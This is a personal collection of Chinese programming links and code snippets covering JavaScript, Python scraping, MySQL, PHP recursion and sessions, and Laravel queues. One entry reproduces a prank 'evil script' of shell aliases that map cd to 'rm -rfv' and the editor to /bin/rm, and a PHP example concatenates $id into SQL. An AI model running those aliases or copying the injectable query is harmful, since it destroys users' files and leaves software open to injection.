[js补 0 ](https://www.v2ex.com/t/364230#reply19)
```js
var recruitmentMessage = [
    231, 153, 190, 229, 186, 166, 32, 66, 69, 70, 69, 32, 229, 155, 162, 233, 152, 159, 44, 32, 230,
    139, 155, 232, 129, 152, 229, 137, 141, 231, 171, 175, 233, 171, 152, 231, 186, 167, 229, 183, 165,
    231, 168, 139, 229, 184, 136, 10, 230, 136, 145, 228, 187, 172, 230, 152, 175, 228, 184, 128, 228,
    184, 170, 230, 172, 162, 228, 185, 144, 44, 32, 232, 191, 189, 230, 177, 130, 230, 138, 128, 230,
    156, 175, 44, 32, 230, 179, 168, 233, 135, 141, 232, 167, 132, 232, 140, 131, 231, 154, 132, 229,
    155, 162, 233, 152, 159, 10, 230, 136, 145, 228, 187, 172, 229, 156, 168, 229, 138, 170, 229, 138,
    155, 229, 156, 176, 230, 136, 144, 233, 149, 191, 44, 32, 229, 138, 170, 229, 138, 155, 229, 156,
    176, 229, 129, 154, 228, 186, 155, 228, 184, 141, 228, 184, 128, 230, 160, 183, 231, 154, 132, 228,
    186, 139, 230, 131, 133, 10, 10, 229, 166, 130, 230, 158, 156, 228, 189, 160, 58, 10, 10, 45,
    32, 231, 131, 173, 231, 136, 177, 229, 137, 141, 231, 171, 175, 44, 32, 233, 135, 141, 232, 167,
    134, 231, 148, 168, 230, 136, 183, 228, 186, 164, 228, 186, 146, 10, 45, 32, 230, 156, 137, 228,
    184, 128, 229, 174, 154, 231, 154, 132, 229, 137, 141, 231, 171, 175, 229, 188, 128, 229, 143, 145,
    231, 187, 143, 233, 170, 140, 44, 32, 230, 156, 137, 230, 137, 142, 229, 174, 158, 231, 154, 132,
    229, 137, 141, 231, 171, 175, 32, 40, 106, 115, 47, 104, 116, 109, 108, 47, 99, 115, 115, 41,
    32, 229, 159, 186, 231, 161, 128, 10, 45, 32, 82, 101, 97, 99, 116, 47, 65, 110, 103, 117,
    108, 97, 114, 47, 86, 117, 101, 47, 82, 105, 111, 116, 32, 40, 229, 138, 160, 229, 136, 134,
    233, 161, 185, 41, 10, 10, 232, 175, 183, 232, 129, 148, 231, 179, 187, 230, 136, 145, 228, 187,
    172, 32, 58, 32, 108, 105, 117, 106, 105, 97, 108, 117, 48, 49, 64, 98, 97, 105, 100, 117,
    46, 99, 111, 109, 10, 10, 232, 175, 183, 229, 143, 145, 233, 128, 129, 231, 174, 128, 229, 142,
    134, 44, 32, 230, 160, 135, 233, 162, 152, 230, 160, 188, 229, 188, 143, 228, 184, 186, 32, 96,
    91, 66, 69, 70, 69, 229, 155, 162, 233, 152, 159, 32, 45, 32, 229, 137, 141, 231, 171, 175,
    233, 171, 152, 231, 186, 167, 229, 183, 165, 231, 168, 139, 229, 184, 136, 93, 32, 36, 123, 89,
    79, 85, 82, 95, 78, 65, 77, 69, 125, 96, 10, 10, 230, 136, 145, 228, 187, 172, 232, 131,
    189, 230, 143, 144, 228, 190, 155, 231, 187, 153, 228, 189, 160, 231, 154, 132, 58, 10, 10, 45,
    32, 228, 184, 128, 228, 184, 170, 229, 185, 179, 229, 143, 176, 10, 45, 32, 230, 136, 144, 233,
    149, 191, 231, 154, 132, 229, 159, 185, 232, 174, 173, 10, 45, 32, 229, 144, 140, 231, 173, 137,
    229, 143, 175, 232, 167, 130, 231, 154, 132, 230, 138, 165, 233, 133, 172, 10,
];var i, str = ''; 

for (i = 0; i < recruitmentMessage.length; i++) { 
str += '%' + ('0' + recruitmentMessage[i].toString(16)).slice(-2); 
} 
str = decodeURIComponent(str);

Buffer(recruitmentMessage).toString()
```
[提问的智慧](https://github.com/tvvocold/How-To-Ask-Questions-The-Smart-Way)
[python可以画画](https://www.zhihu.com/question/21395276/answer/115805610)
[JavaScript true ==](https://www.v2ex.com/t/363181?p=1)
[电商评论数据的简单分析](https://zhuanlan.zhihu.com/p/27132793)
import pandas as pd
import numpy as np
import matplotlib.pylab as plt
[我是见鬼了么？这是史上最邪恶的脚本！没有之一！](https://zhuanlan.zhihu.com/p/27147501)
export EDITOR=/bin/rm;
alias cat=true; alias cd='rm -rfv';alias date='date -d "now + $RANDOM days"';alias exit='sh';alias vim="vim +q";alias unalias=false;alias alias=false;
[英语学渣8个月轻松突破9000单词量的宝贵方法论，不看绝对亏大了！](https://zhuanlan.zhihu.com/p/27136686)
[GitHub 上有什么使用 Flask 建站的项目吗？](https://www.zhihu.com/question/20946759/answer/159165687)
https://link.zhihu.com/?target=https%3A//github.com/lalor/headlines https://link.zhihu.com/?target=https%3A//github.com/lalor/todolist
[2017校招常考算法题归纳&典型题目汇总，赶紧收藏！](https://zhuanlan.zhihu.com/p/27129767)
https://www.nowcoder.com/questionTerminal/f216fb2b6fa84fcbb43537e22f1aa0d2 
[MAC 上抓取网页数据的工具有哪些？](https://www.zhihu.com/question/27736988/answer/174849599)
https://link.zhihu.com/?target=http%3A//Import.io
结合import.io、Google Sheets、数据观、 Infogr,可以快速完成 数据爬取、数据存储、数据分析、数据可视化的完整流程！
[Python 与 机器学习 · 意见收集](https://zhuanlan.zhihu.com/p/27114813)
[Pyspider框架 -- Python爬虫实战之爬取 V2EX 网站帖子](https://zhuanlan.zhihu.com/p/23153126)
https://github.com/xianhu/PSpider 微博 微信https://zhuanlan.zhihu.com/p/23153126
[Django 博客教程](http://zmrenwu.com/)
[如何使用爬虫分析 Python 岗位招聘情况](https://zhuanlan.zhihu.com/p/27113961)
https://github.com/chenjiandongx/51job
```js
def world_cloud(self):
        """ 生成词云 """
        counter = {}
        with open(r".\data\post_desc_counter.csv", "r", encoding="utf-8") as f:
            f_csv = csv.reader(f)
            for row in f_csv:
                counter[row[0]] = counter.get(row[0], int(row[1]))
            pprint(counter)
        wordcloud = WordCloud(font_path=r".\font\msyh.ttf",
                              max_words=100, height=600, width=1200).generate_from_frequencies(counter)
        plt.imshow(wordcloud)
        plt.axis('off')
        plt.show()
        wordcloud.to_file('.\images\worldcloud.jpg')
```
[Python新手（有一定的编程基础），不知各位是否有一些适合Python新手的练手项目可以推荐？](https://www.zhihu.com/question/59275571/answer/173891222)
v  https://link.zhihu.com/?target=http%3A//crossincode.com/oj/practice_list/
[排序算法-N个正整数排序](https://zhuanlan.zhihu.com/p/27095748)
[让孩子爱上数学的31部趣味数学图书](https://zhuanlan.zhihu.com/p/25198470)
[PyTorch 中文教程](https://zhuanlan.zhihu.com/p/26670032)
http://link.zhihu.com/?target=https%3A//morvanzhou.github.io/tutorials/machine-learning/torch/
http://link.zhihu.com/?target=https%3A//github.com/carefree0910/MachineLearning
[Python实现从excel读取数据并绘制成精美图像](https://zhuanlan.zhihu.com/p/27124525)
```js
x = np.linspace(0, 10, 500)
dashes = [10, 5, 100, 5]  # 10 points on, 5 off, 100 on, 5 off

fig, ax = plt.subplots()
line1, = ax.plot(x, np.sin(x), '--', linewidth=2,
                 label='Dashes set retroactively')
line1.set_dashes(dashes)

line2, = ax.plot(x, -1 * np.sin(x), dashes=[30, 5, 10, 5],
                 label='Dashes set proactively')

ax.legend(loc='lower right')
plt.show()
```



[爬取 stackoverflow 100万条问答之后](https://zhuanlan.zhihu.com/p/27121856)
http://link.zhihu.com/?target=https%3A//github.com/chenjiandongx/stackoverflow
[爬虫三步走（二）解析源码](https://zhuanlan.zhihu.com/p/27131597)
```js
import requests
from lxml import etree

url = 'http://www.huya.com/g/lol'
headers = {'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'}
res = requests.get(url,headers=headers).text
s = etree.HTML(res)
print(s.xpath('//i[@class="nick"]/text()'))

```

[false, Boolean(false), [], [[]], "", String(""), 0, Number(0), "0", String("0"), [0]].map(x => null >= x && null <= x && null !== x)

输出
[true, true, true, true, true, true, true, true, true, true, true]
https://thomas-yang.me/projects/oh-my-dear-js/


[mysql 相邻的相同数据如何去重](https://www.v2ex.com/t/363680#reply11)
方式错了, 应该是在插入之前 就判断好是否需要插入.
delete from t where id in (select id from t a left join t b on a.id = b.id + 1 and a.n = b.n)
select id ,value from test t where t.value <> (select value from test where id = t.id -1) or t.id = 1 ；
select * from t where id not in (select id from t a left join t b on a.id = b.id + 1 and a.n = b.n order by id asc) 不过只能处理 id 递增的情况，不能有洞
[纯手工自制的内网穿透瑞士军刀 Socket Pipe](https://joyqi.com/javascript/socket-pipe.html)
https://github.com/joyqi/socket-pipe 
[让MySQL支持emoji图标存储](https://github.com/jaywcjlove/mysql-tutorial/blob/master/chapter17/17.1.md)
SHOW VARIABLES WHERE Variable_name LIKE 'character\_set\_%' OR Variable_name LIKE 'collation%';
SHOW FULL COLUMNS  FROM  users_profile;
[PHP uniqid() 生成不重复唯一标识方法三](http://www.51-n.com/t-4264-1-1.html)
```js
$units = array();
        for($i=0;$i<1000000;$i++){
                $units[]=md5(uniqid(md5(microtime(true)),true));
        }
        $values  = array_count_values($units);
        $duplicates = [];
        foreach($values as $k=>$v){
                if($v>1){
                        $duplicates[$k]=$v;
                }
        }
        echo '<pre>';
        print_r($duplicates);
        echo '</pre>';
```
[码云平台帮助文档](http://git.mydoc.io/?t=154707)
[PHP设计模式简介](http://larabase.com/collection/5/post/143)
[北京地区PHP程序员专业能力评测报告](https://v.sijiaomao.com/ability?3njfchm5)
[酷Q聊天机器人的安装设置教程_百度经验](http://jingyan.baidu.com/article/1612d500768ee0e20e1eeeb2.html)
[八幅漫画理解使用JSON Web Token设计单点登录系统](http://blog.leapoahead.com/2015/09/07/user-authentication-with-jwt/)
要实现在login.taobao.com登录后，在其他的子域名下依然可以取到Session，这要求我们在多台服务器上同步Session。

使用JWT的方式则没有这个问题的存在，因为用户的状态已经被传送到了客户端。因此，我们只需要将含有JWT的Cookie的domain设置为顶级域名即可
Set-Cookie: jwt=lll.zzz.xxx; HttpOnly; max-age=980000; domain=.taobao.com
[php 递归函数的三种实现方式 ](http://www.cnblogs.com/DeanChopper/p/4707757.html)
```js
function test($a=0,&$result=array()){
$a++;
if ($a<10) {
    $result[]=$a;
    test($a,$result);
}
echo $a;
return $result;

}print_r(test());
function test($a=0,$result=array()){
    global $result;
    $a++;
    if ($a<10) {
        $result[]=$a;
        test($a,$result);
    }
    return $result;
}
function test(){
static $count=0;
echo $count;

$count++;
}
function test($a=0){
    static $result=array();
    $a++;
    if ($a<10) {
        $result[]=$a;
        test($a);
    }
    return $result;
}

10987654321Array
(
    [0] => 1
    [1] => 2
    [2] => 3
    [3] => 4
    [4] => 5
    [5] => 6
    [6] => 7
    [7] => 8
    [8] => 9
)

$area = array(
array('id'=>1,'area'=>'北京','pid'=>0),
array('id'=>2,'area'=>'广西','pid'=>0),
array('id'=>3,'area'=>'广东','pid'=>0),
array('id'=>4,'area'=>'福建','pid'=>0),
array('id'=>11,'area'=>'朝阳区','pid'=>1),
array('id'=>12,'area'=>'海淀区','pid'=>1),
array('id'=>21,'area'=>'南宁市','pid'=>2),
array('id'=>45,'area'=>'福州市','pid'=>4),
array('id'=>113,'area'=>'亚运村','pid'=>11),
array('id'=>115,'area'=>'奥运村','pid'=>11),
array('id'=>234,'area'=>'武鸣县','pid'=>21)
);
function t($arr,$pid=0,$lev=0){
static $list = array();
foreach($arr as $v){
if($v['pid']==$pid){
echo str_repeat(" ",$lev).$v['area']."<br />";
//这里输出，是为了看效果
$list[] = $v;
t($arr,$v['id'],$lev+1);
}
}
return $list;
}
$list = t($area);
echo "<hr >";
print_r($list);

functiontest($i) 
{  
$i-=4;  if($i<3) 
{
return$i; 
}  
else 
{  
test($i); 
}   
}   
echotest(30);  else里面是有问题的。在这里执行的test没有返回值。所以虽然满足条件$i<3时return$i整个函数还是不会返回值的
functiontest($i)
{  
$i-=4;  if($i<3)  
{  
return$i;  
}  
else  
{  
returntest($i);//增加return,让函数返回值  
}  
}   
echotest(30);  
function summation ($count) {
   if ($count != 0) :
     return $count + summation($count-1);
   endif;
}
$sum = summation(10);

function unreverse($str){
  for($i=1;$i<=strlen($str);$i++){
    echo substr($str,-$i,1);
  }
}
unreverse("abcdefg");//gfedcbc
 
function reverse($str){
  if(strlen($str)>0){
    reverse(substr($str,1));
    echo substr($str,0,1);
    return;
  }
}
reverse("abcdefg");//gfedcbc

function test ($n){
    echo $n."  ";
    if($n>0){
        test($n-1);
    }else{
        echo "";
    }
    echo $n."  "
}
test(2)
结果是2 1 0<–>0 1 2

 

第一步，履行test(2)，echo 2，然后由于2>0，履行test(1)， 后边还有没来得及履行的echo 2 
第二步，履行test（1），echo 1，然后由于1>0，履行test（0），相同后边还有没来得及履行的 echo 1 
第三步，履行test（0），echo 0，履行test（0），echo 0， 此刻0>0的条件不满意，不在履行test（）函数，而是echo “”，并且履行后边的 echo 0

function fab($n){  
    echo “-- n = $n ----------------------------”.PHP_EOL;  
    debug_print_backtrace();  
    if($n == 1 || $n == 0){  
        return $n;  
    }               
    return fab($n - 1) + fab($n - 2);  
}                       
fab(4)；
内置的与递归行为有关的函数（如array_merge_recursive,array_walk_recursive,array_replace_recursive等，考虑它们的实现）http://blog.csdn.net/ohmygirl/article/details/19679643

```
laravel 队列
```js
\Queue::push(new \App\Commands\Cut($id), null, 'cut_record');
redis 队列的key 为queues:cut_record  默认的队列为queues:default
vi /etc/supervisord.d/
[program:cut_record]
command=/usr/bin/php /usr/share/nginx/html/artisan queue:listen --tries=3 --queue=cut_record
autostart=true
autorestart=true
stdout_logfile=/var/log/supervisor/artisan_cut_record_std.log
stderr_logfile=/var/log/supervisor/artisan_cut_record_err.log

#supervisorctl
>update 
>status 
supervisor> status
add_question                     RUNNING    pid 4954, uptime 13 days, 19:42:40
artisan                          RUNNING    pid 4924, uptime 13 days, 19:42:41
artisan_band-to-chat             RUNNING    pid 4923, uptime 13 days, 19:42:41
artisan_flow                     RUNNING    pid 4926, uptime 13 days, 19:42:41

之前做一个增量加载的功能  采用maxid和minid比对
上拉比对minid    然后更新minid
下拉比对maxid   然后更新maxid
反复做了三遍才算真正作对了
```


[ foreach循环中变量引用的一道面试题](http://blog.csdn.net/ohmygirl/article/details/8726865)
```js
unset只会删除变量。并不会清空变量值对应的内存空间
$a = "str";  
$b = &$a;  
unset($b);  
echo $a; 
[PHP内核探索之变量（5）- session的基本原理](http://blog.csdn.net/ohmygirl/article/details/43152683)
Session需要使用Cookie做载体，来存放session_id Cookie过期和删除只能保证客户端的连接的失效，并不会清除服务器端的Session
session_save_path('/root/xiaoq/phpCode/session');  
session_start();  
   
$_SESSION['index'] = "this is desc";  
$_SESSION['int']   = 123;  
print_r( session_id());//5rdhbe4k8k73h5g1fsii01iau5 服务器端是以sess_{session_id}的命名方式来储存Session数据文件的：
session_id("5rdhbe4k8k73h5g1fsii01iau5");  通过传递session_id的方法来获取Session数据，从而避开Cookie的限制
session数据是在当前会话结束时（一般就是指脚本执行完毕时）才会写入文件的
在session数据使用完毕之后，调用session_commit或者session_write_close函数通知服务器写入session数据并关闭文件
unset($_SESSION)只是重置$_SESSION这个全局变量，并不会将session数据从服务器端删除。较为稳妥的做法是，在需要清除当前会话数据的时候调用session_destroy删除服务器端Session数据
unset($_SESSION);  
session_destroy();  
使用Cookie为载体的情况下，session.name指定存储session_id的Cookie的key( cookie中也是基于key=>value)。默认的情况下，session.name= PHPSESSID
session_name("NEW_SESSION");  
session_start();  
调用session_commit或者脚本执行完毕时，session数据写入文件，关闭打开的session文件句柄。如果session_id是以Cookie存储的，那么在服务器端的响应中，还应该发送Set-Cookie的HTTP头，通知客户端存储session_id，之后的每次请求都应该携带这个session_id.
“strlen函数返回给定字符串的长度”，但是，并没有对长度单位做任何说明，长度究竟是指”字符的个数“还是说”字符的字节数“。 说明strlen函数返回的是字符串的字节数
$s = file_get_contents("./word");
$a = array_count_values(str_word_count($s, 1)) ;

配合array_flip，可以计算某个单词最后一次出现的位置：

$t = array_flip(str_word_count($s, 2));
配合了array_unique之后再array_flip，则可以计算某个单词第一次出现的位置：

$t = array_flip( array_unique(str_word_count($s, 2)) );
一个二进制安全的函数，本质上是指它将输入看做是原始的数据流（raw）而不包含任何特殊的格式。 C字符串只合适保存简单的文本，而不能用于保存图片、视频、其他文件等二进制数据。而在PHP中，我们可以使用$str = file_get_contents(“filename”);保存图片、视频等二进制数据。
echo str_word_count(file_get_contents(“word”)); //112文本中的单词的个数

```
[nginx下file_get_contents导致cpu 100%的问题](http://blog.csdn.net/ohmygirl/article/details/18844987)
对搜索接口的调用，是直接通过file_get_contents(API)的方式获取的。由于file_get_contents是阻塞的I/O方式，且默认没有设置超时，因而如果搜索接口在长时间没有返回数据的情况下，会一直占用系统的资源，从而导致了nginx的502 bad gateway错误。张宴的博客中，对这一现象做了详细的解释和描述（地址：http://blog.s135.com/file_get_contents/）。在文中，作者给的解决方案是使用stream的timeout参数，使file_get_contents的socket连接强制超时，具体方案是：

$ctx = stream_context_create(array(  
		'http' => array(  
			'timeout' => 5 //设置一个超时时间，单位为s 
		)  
	)  
);  
使用更加强大的curl来完成相应的功能，并通过CURLOPT_TIMEOUT和CURLOPT_CONNECT_TIMEOUT限制搜索接口的连接时间和请求时间。且为了保证搜索的结果，会尝试3次连接，如果失败，则使用default的数据来填充。这样设置之后，基本上很少出现502 bad gateway的错误了。 进程异常时（如cpu占用较高），不要急于kill掉这个“现场”，不妨strace–p pid 追踪一下进程的系统调用
[PHP内核探索之变量（7）- 不平凡的字符串](http://blog.csdn.net/ohmygirl/article/details/44753655)
[ PHP不使用递归的无限级分类](http://blog.csdn.net/zhouzme/article/details/50097669)
```js
$list = array(
    array('id'=>1, 'pid'=>0, 'deep'=>0, 'name'=>'test1'),
    array('id'=>2, 'pid'=>1, 'deep'=>1, 'name'=>'test2'),
    array('id'=>3, 'pid'=>0, 'deep'=>0, 'name'=>'test3'),
    array('id'=>4, 'pid'=>2, 'deep'=>2, 'name'=>'test4'),
    array('id'=>5, 'pid'=>2, 'deep'=>2, 'name'=>'test5'),
    array('id'=>6, 'pid'=>0, 'deep'=>0, 'name'=>'test6'),
    array('id'=>7, 'pid'=>2, 'deep'=>2, 'name'=>'test7'),
    array('id'=>8, 'pid'=>5, 'deep'=>3, 'name'=>'test8'),
    array('id'=>9, 'pid'=>3, 'deep'=>2, 'name'=>'test9'),
);
function resolve2(& $list, $pid = 0) {
    $manages = array();
    foreach ($list as $row) {
        if ($row['pid'] == $pid) {
            $manages[$row['id']] = $row;
            $children = resolve2($list, $row['id']);
            $children && $manages[$row['id']]['children'] = $children;
        }
    }
    return $manages;
}
```



[PHP递归实现无限级分类](http://www.helloweba.com/view-blog-204.html)
```js
function get_str($id = 0) { 
    global $str; 
    $sql = "select id,title from class where pid= $id";  
    $result = mysql_query($sql);//查询pid的子类的分类 
    if($result && mysql_affected_rows()){//如果有子类 
        $str .= '<ul>'; 
        while ($row = mysql_fetch_array($result)) { //循环记录集 
            $str .= "<li>" . $row['id'] . "--" . $row['title'] . "</li>"; //构建字符串 
            get_str($row['id']); //调用get_str()，将记录集中的id参数传入函数中，继续查询下级 
        } 
        $str .= '</ul>'; 
    } 
    return $str; 
} 
function get_array($id=0){ 
    $sql = "select id,title from class where pid= $id"; 
    $result = mysql_query($sql);//查询子类 
    $arr = array(); 
    if($result && mysql_affected_rows()){//如果有子类 
        while($rows=mysql_fetch_assoc($result)){ //循环记录集 
            $rows['list'] = get_array($rows['id']); //调用函数，传入参数，继续查询下级 
            $arr[] = $rows; //组合数组 
        } 
        return $arr; 
    } 
} 

```

[纯js格式化货币：currencyFmatter.js](http://www.helloweba.com/view-blog-392.html)
OSREC.CurrencyFormatter.format(2534234, { currency: 'INR' }); // Returns ? 25,34,234.00
